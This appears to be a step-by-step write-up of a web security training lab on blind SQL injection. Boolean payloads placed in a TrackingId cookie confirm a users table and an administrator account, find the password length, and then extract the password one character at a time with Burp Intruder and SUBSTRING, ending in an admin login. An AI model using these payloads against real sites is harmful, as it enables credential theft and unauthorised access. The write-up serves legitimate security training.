1. Suppose the track id is xyz.  Use Burp Suite to modify the Cookie: ``` TrackingId=xyz' AND '1'='1 ```. The SQL query now become ``` SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xyz' AND '1' ='1' ```. The response contains the message "Welcome back"

2. Use Burp Suite to modify the Cookie: ``` TrackingId=xyz' AND '1'='2 ```. The SQL query now become ``` SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xyz' AND '1' ='2' ```. The response doesn't contain the message "Welcome back"

3. ``` ' AND (SELECT 'a' from users LIMIT 1)='a ```. The response contains the message "Welcome back" => the table users exists.

4. ``` ' AND (SELECT 'a' from users WHERE username = 'administrator')='a ```. The response contains the message "Welcome back" => there is an username called administrator.

5. 
``` ' AND (SELECT 'a' from users WHERE username = 'administrator'AND LENGTH(password)>1)='a ``` => True
``` ' AND (SELECT 'a' from users WHERE username = 'administrator'AND LENGTH(password)>5)='a ``` => True
``` ' AND (SELECT 'a' from users WHERE username = 'administrator'AND LENGTH(password)>10)='a ``` => True
``` ' AND (SELECT 'a' from users WHERE username = 'administrator'AND LENGTH(password)>15)='a ``` => True
``` ' AND (SELECT 'a' from users WHERE username = 'administrator'AND LENGTH(password)>20)='a ``` => False
``` ' AND (SELECT 'a' from users WHERE username = 'administrator'AND LENGTH(password)>17)='a ``` => True
``` ' AND (SELECT 'a' from users WHERE username = 'administrator'AND LENGTH(password)>19)='a ``` => True
=> password's length = 20

7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.

8. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
In the Positions tab, change the value of the cookie to: TrackingId=LUZ8q4FguGIeDsvB' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a. This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

9. Place payload markers in necessary positions (the first 1 number and the final a character) where we will iterate through all different possibilities to find the correct character at each position of 20 position => Finally, we will be able to get the whole password. Change the value of the cookie to: TrackingId=LUZ8q4FguGIeDsvB' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), §1§, 1) = '§a§

10. For payload set 1 (iterate over all possible positions from 1 to 20 of the 20 characters password), go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" fill in the list of all numbers from 1 - 20. For payload set 2 (iterate over all possible characters at a position of the 20-chracters password), go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.

11. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the Options tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".
Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.

12. Review the attack results to find the correct value of the character at each position. Click on the 'Welcome back' column header to sort it results and see all rows which have tick in this column, which means that in these row, the character in payload 2 is the correct character of the password in the position corresponding to the value of payload 1. Gather all of that information to get the correct password.

13. Login with username 'administrator' and the correct password.

14. Better solution: Instead of iterating over every character, you could perform a binary search of the character space.